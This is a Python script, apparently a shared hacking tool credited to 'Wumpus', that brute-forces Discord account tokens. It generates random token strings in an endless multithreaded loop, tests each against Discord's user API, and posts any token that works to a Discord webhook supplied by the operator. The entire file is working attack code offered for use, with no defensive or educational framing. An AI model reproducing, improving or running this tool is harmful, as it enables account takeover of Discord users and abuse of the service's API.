import string
import requests
import json
import random
import threading
import os
from pystyle import Colorate, Colors
import colorama
from colorama import Fore, Style

username_webhook = "Wumpus - .gg/datas"
avatar_webhook = "https://photosrush.com/wp-content/uploads/boy-discord-pfp-2.jpg"  
color_webhook = 0x00ff00  

def CheckWebhook(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[INFO] Webhook URL is valid.")
        else:
            print(f"{Fore.RED}[ERROR] Invalid Webhook URL.")
            exit()
    except:
        print(f"{Fore.RED}[ERROR] Failed to connect to Webhook URL.")
        exit()

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan, """
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

colorama.init(autoreset=True)

def get_webhook_input():
    webhook = input(f"{Fore.YELLOW}[INPUT] Webhook? (y/n) -> {Style.RESET_ALL}")
    if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
        webhook_url = input(f"{Fore.YELLOW}[INPUT] Webhook URL -> {Style.RESET_ALL}")
        CheckWebhook(webhook_url)
        return webhook_url
    return None

def get_threads_number():
    try:
        return int(input(f"{Fore.YELLOW}[INPUT] Threads Number -> {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}[ERROR] Invalid number.")
        exit()

def send_webhook(embed_content, webhook_url):
    payload = {
        'embeds': [embed_content],
        'username': username_webhook,
        'avatar_url': avatar_webhook
    }
    headers = {
        'Content-Type': 'application/json'
    }
    requests.post(webhook_url, data=json.dumps(payload), headers=headers)

def token_check():
    first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
    third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
    token = f"{first}.{second}.{third}"

    try:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        if user.get('username'):
            print(f"{Fore.GREEN}[VALID] Token: {token}")
            if webhook_url:
                embed_content = {
                    'title': 'Token Valid!',
                    'description': f"**Token:**\n```{token}```",
                    'color': color_webhook,
                    'footer': {
                        "text": username_webhook,
                        "icon_url": avatar_webhook,
                    }
                }
                send_webhook(embed_content, webhook_url)
        else:
            print(f"{Fore.RED}[INVALID] Token: {token}")
    except:
        print(f"{Fore.RED}[ERROR] Token: {token}")

def request():
    threads = []
    for _ in range(threads_number):
        t = threading.Thread(target=token_check)
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    webhook_url = get_webhook_input()
    threads_number = get_threads_number()
    
    while True:
        request()
